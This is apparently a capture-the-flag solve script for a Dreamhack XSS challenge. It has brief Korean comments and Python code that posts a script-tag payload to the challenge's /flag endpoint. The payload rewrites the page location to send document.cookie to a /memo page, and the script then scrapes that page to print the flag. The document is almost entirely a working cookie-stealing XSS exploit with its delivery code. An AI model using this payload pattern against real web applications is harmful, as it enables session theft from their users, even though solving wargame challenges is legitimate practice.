'''
vuln.html 에서 var name_elem = document.getElementById("name"); 부분이 핵심
'''
'''
<script id="name"></script>
'''

#location.href='/memo?memo='+document.cookie;//
from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:21703"
FLAG_URI = "/flag"
MEMO_URI = "/memo"
PARAM = '<script id=name></script>'
NAME = "location.href='/memo?memo='+document.cookie;//"

PAYLOAD = {'param': PARAM, 'name': NAME}

# 1. Execute Payload and Get Flag
requests.post(URL + FLAG_URI, data=PAYLOAD)

#2. Print Flag
resp = requests.get(URL + MEMO_URI)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)